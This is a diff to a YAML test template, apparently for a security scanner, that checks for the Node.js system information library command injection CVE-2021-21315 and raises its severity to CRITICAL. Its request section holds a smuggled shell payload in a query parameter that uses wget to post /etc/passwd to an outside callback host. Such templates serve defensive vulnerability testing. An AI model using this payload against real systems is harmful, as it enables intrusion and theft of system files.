@@ -2,20 +2,26 @@ id: NODE_JS_SYS_INFO_RCE
 info:
   name: "Node.JS System Information Library Remote Command Injection"
   description: "This vulnerability affects the system information library used in Node.js applications. It allows attackers to inject and execute arbitrary system commands through user input that is improperly sanitized. Exploiting this flaw can lead to remote command execution on the server, potentially allowing attackers to gain unauthorized access or control over the affected system."
-  details:  "This vulnerability is due to improper handling of user-supplied input within the system information library. Attackers can exploit this flaw by crafting input that includes system command sequences, which the library executes without adequate sanitization. This allows unauthorized execution of arbitrary commands on the server, posing significant security risks by potentially allowing attackers to compromise or manipulate the system."
+  details: "This vulnerability is due to improper handling of user-supplied input within the system information library. Attackers can exploit this flaw by crafting input that includes system command sequences, which the library executes without adequate sanitization. This allows unauthorized execution of arbitrary commands on the server, posing significant security risks by potentially allowing attackers to compromise or manipulate the system."
   impact: "The impact of this vulnerability is severe, as it enables attackers to execute arbitrary system commands on the server. This can lead to full system compromise, allowing unauthorized access, data manipulation, and control over the affected environment. The vulnerability increases the risk of data breaches, service disruption, and further exploitation by providing attackers with significant control over the server."
   category:
     name: COMMAND_INJECTION
     shortName: Command Injection
     displayName: Command Injection
   subCategory: NODE_JS_SYS_INFO_RCE
-  severity: MEDIUM
+  severity: CRITICAL
   references:
     - "https://twitter.com/trbughunters/status/1283133356922884096"
   cwe:
     - CWE-77
   cve:
     - CVE-2021-21315
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
 
 api_selection_filters:
   method:
@@ -32,12 +38,11 @@ execute:
   type: single
   requests:
     - req:
-      - modify_method: GET
-      - modify_url: "/api/getServices"
-      - add_query_param:
-          !!str name[]: "$(wget%20--post-file%20/etc/passwd%20https://test-services.akto.io/${random_uuid})"
-      - replace_body: '{}'
-      
+        - modify_method: GET
+        - modify_url: "/api/getServices"
+        - add_query_param:
+            !!str name[]: "$(wget%20--post-file%20/etc/passwd%20https://test-services.akto.io/${random_uuid})"
+        - replace_body: '{}'
 validate:
   response_code:
     eq: 200
